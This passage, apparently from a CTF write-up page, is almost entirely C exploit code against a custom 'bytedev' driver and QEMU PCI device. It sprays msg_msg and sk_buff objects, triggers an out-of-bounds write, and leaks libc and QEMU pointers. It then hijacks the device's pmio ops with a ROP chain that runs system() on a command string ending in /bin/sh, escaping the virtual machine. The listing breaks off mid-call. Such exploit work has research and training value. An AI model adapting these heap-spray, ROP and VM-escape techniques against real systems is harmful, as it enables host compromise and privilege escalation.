class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MSG_COPY</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_COPY 040000</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff81e2d980</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810bb9c04</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff8224aca0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810bb710</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81a01086</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff811af57d</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BUF_SIZE (4096 - sizeof(struct bytedev_data))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_MODE_CHANGE 0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_BLK_IDX_CHANGE 0x1919810</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BYTEDEV_SECTOR_NUM 256</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_SYSTEM 0x50d60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RSP_RDX_RET 0x5a170</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20 0x1675b0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_POP_RDI_RET 0x2a3e5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_RET 0x2a3e6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_BIN_SH 0x1d8698</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LIBC_PUTS 0x80ed0</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">BYTEDEV_MODE</span> &#123;</span><br>    BYTEDEV_MODE_STREAM = <span class="hljs-number">0</span>,<br>    BYTEDEV_MODE_BLK,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> len, offset;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>  &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125; secondary_msg;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_second_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) \<br>                + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> &#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\n\033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">peekMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-type">int</span> __msgsz = msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>);<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, __msgsz, msgtyp, MSG_COPY | IPC_NOWAIT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">buildMsg</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> msg_msg *msg, <span class="hljs-type">uint64_t</span> m_list_next, <span class="hljs-type">uint64_t</span> m_list_prev, </span><br><span class="hljs-params">              <span class="hljs-type">uint64_t</span> m_type, <span class="hljs-type">uint64_t</span> m_ts,  <span class="hljs-type">uint64_t</span> next, <span class="hljs-type">uint64_t</span> security)</span><br>&#123;<br>    msg-&gt;m_list.next = m_list_next;<br>    msg-&gt;m_list.prev = m_list_prev;<br>    msg-&gt;m_type = m_type;<br>    msg-&gt;m_ts = m_ts;<br>    msg-&gt;next = next;<br>    msg-&gt;security = security;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spraySkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">freeSkBuff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigerOutOfBoundWrite</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-type">int</span> socket_fd[<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bytedev_data</span> *<span class="hljs-title">fake_data</span>;</span><br>    <span class="hljs-type">char</span> *trash_data;<br><br>    <span class="hljs-comment">/* free the first buffer in bytedev queue */</span><br>    trash_data = <span class="hljs-built_in">malloc</span>(BYTEDEV_BUF_SIZE);<br>    <span class="hljs-built_in">memset</span>(trash_data, <span class="hljs-number">0x84</span>, BYTEDEV_BUF_SIZE);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] write %ld bytes to dev \n&quot;</span>, <br>            write(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] read %ld bytes from dev\n&quot;</span>, <br>            read(dev_fd, trash_data, BYTEDEV_BUF_SIZE));<br><br>    <span class="hljs-comment">/* construct fake bytedev_data */</span><br>    fake_data = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bytedev_data) + BYTEDEV_BUF_SIZE);<br>    fake_data-&gt;len = BYTEDEV_BUF_SIZE + <span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] re-get the buffer by sk_buff...&quot;</span>);<br>    write(socket_fd[<span class="hljs-number">0</span>], fake_data, BYTEDEV_BUF_SIZE - <span class="hljs-number">320</span>);<br><br>    <span class="hljs-comment">/* make an OOB write */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB write to nearby object...&quot;</span>);<br>    write(dev_fd, trash_data, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* to prevent the memory leaking */</span><br>    <span class="hljs-built_in">free</span>(trash_data);<br>    <span class="hljs-built_in">free</span>(fake_data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemuEscape</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd, ret;<br>    <span class="hljs-type">uint64_t</span> buf[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> fake_ops[BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>)];<br>    <span class="hljs-type">uint64_t</span> libc_base, opaque, byte_dev_pmio_read;<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    ioctl(dev_fd, BYTEDEV_MODE_CHANGE, BYTEDEV_MODE_BLK);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * SECTOR -23: container</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> in docker-built Ubuntu 22.04, we cannot leak libc there.</span><br><span class="hljs-comment">     *      [55] g_str_hash</span><br><span class="hljs-comment">     *      [56] g_str_equal</span><br><span class="hljs-comment">     * SECTOR -24: BYTEPCIDevState</span><br><span class="hljs-comment">     *      [27~34] name</span><br><span class="hljs-comment">     *      [35~] io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     * SECTOR -25: byte_dev_pmio_ops</span><br><span class="hljs-comment">     *      [0] byte_dev_pmio_read</span><br><span class="hljs-comment">     *      [1] byte_dev_pmio_write</span><br><span class="hljs-comment">     * SECTOR -355 &amp;io_regions[PCI_NUM_REGIONS]</span><br><span class="hljs-comment">     *      SECTOR -352 MemoryRegion - mmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     *      SECTOR -347 MemoryRegion - pmio</span><br><span class="hljs-comment">     *          [4] opaque</span><br><span class="hljs-comment">     *          [9] ops</span><br><span class="hljs-comment">     * SECTOR -388</span><br><span class="hljs-comment">     *      [8] &lt;g_str_hash&gt;</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I leak basic info</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I leak basic\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -388 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-388</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">7</span>] &lt; <span class="hljs-number">0x7f0000000000</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; BYTEDEV_SECTOR_SIZE / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>); i++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[--data-dump--][%d] %lx\n&quot;</span>, i, buf[i]);<br>        &#125;<br>        errExit(<span class="hljs-string">&quot;failed to leak libc related ptr!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* This&#x27;s the offset on the Ubuntu 22.04: GLIBC 2.35-0ubuntu3.1 */</span><br>    libc_base = buf[<span class="hljs-number">7</span>] - <span class="hljs-number">0x3ea410</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got libc_base: \033[0m%lx\n&quot;</span>, libc_base);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -25 sector...\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-25</span>);<br>    read(dev_fd, fake_ops, BYTEDEV_SECTOR_SIZE);<br>    byte_dev_pmio_read = fake_ops[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got byte_dev_pmio_read: \033[0m%lx\n&quot;</span>, <br>            byte_dev_pmio_read);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Reading from -347 sector...\033[0m&quot;</span>);<br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br>    opaque = buf[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got opaque: \033[0m%lx\n&quot;</span>, opaque);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II construct fake pmio-&gt;ops</span><br><span class="hljs-comment">     * There we make the opaque.parent_obj.name the ops,</span><br><span class="hljs-comment">     * so that nothing will be effects</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.II construct fake pmio-&gt;ops\033[0m&quot;</span>);<br>    <br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-24</span>);<br>    read(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    buf[<span class="hljs-number">33</span>] = buf[<span class="hljs-number">34</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span>*)&amp;buf[<span class="hljs-number">33</span>], <span class="hljs-string">&quot;ls;cat ./flag;gnome-calculator;/bin/sh&quot;</span>);<br><br>    <span class="hljs-comment">/* the new rdx starts there */</span><br>    buf[<span class="hljs-number">28</span>] = libc_base + LIBC_POP_RDI_RET;<br>    buf[<span class="hljs-number">29</span>] = opaque + <span class="hljs-number">33</span> * <span class="hljs-number">8</span>;<span class="hljs-comment">//libc_base + LIBC_BIN_SH;</span><br>    buf[<span class="hljs-number">30</span>] = libc_base + LIBC_SYSTEM;<br>    <span class="hljs-comment">//buf[31] = </span><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * [rdx + 20]</span><br><span class="hljs-comment">     * mov rsp, rdx ; ret</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">32</span>] = libc_base + LIBC_MOV_RSP_RDX_RET;<br><br>    <span class="hljs-comment">/* the [rdi + 8] */</span><br>    buf[<span class="hljs-number">1</span>] = opaque + <span class="hljs-number">28</span> * <span class="hljs-number">8</span>;<br><br>    <span class="hljs-comment">/* fake ops on bar space */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        buf[<span class="hljs-number">50</span> + i] = fake_ops[i];<br>    &#125;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * mov rdx, qword ptr [rdi + 8] ; -&gt; store the ptr in opaque[1]</span><br><span class="hljs-comment">     * mov qword ptr [rsp], rax ; </span><br><span class="hljs-comment">     * call qword ptr [rdx + 0x20]  -&gt; another call</span><br><span class="hljs-comment">     */</span><br>    buf[<span class="hljs-number">51</span>] = <br>        libc_base + LIBC_MOV_RDX_PTRRDIADD8_MOV_PTRRSP_RAX_CALL_PTRRDXADD0x20;<br><br>    write(dev_fd, buf, BYTEDEV_SECTOR_SIZE);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III change pmio-&gt;ops to fake ops on opaque</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III change pmio-&gt;ops to fake ops\033[0m&quot;</span>);<br><br>    ioctl(dev_fd, BYTEDEV_BLK_IDX_CHANGE, <span class="hljs-number">-347</span>);<br>    read(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    buf[<span class="hljs-number">9</span>] = opaque + <span class="hljs-number">50</span> * <span class="hljs-number">8</span>;<br>    write(dev_fd, buf, <span class="hljs-number">10</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">uint64_t</span>));<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Done!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV trigger fake pmio-&gt;ops.read to escape</span><br><span class="hljs-comment">     * There we need to set opaque[1] to opaque.parent_obj.name</span><br><span class="hljs-comment">     * and do something wonderful there...</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV trigger fake ops to escape\n\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">//sleep(5);</span><br>    ioctl(dev_fd, 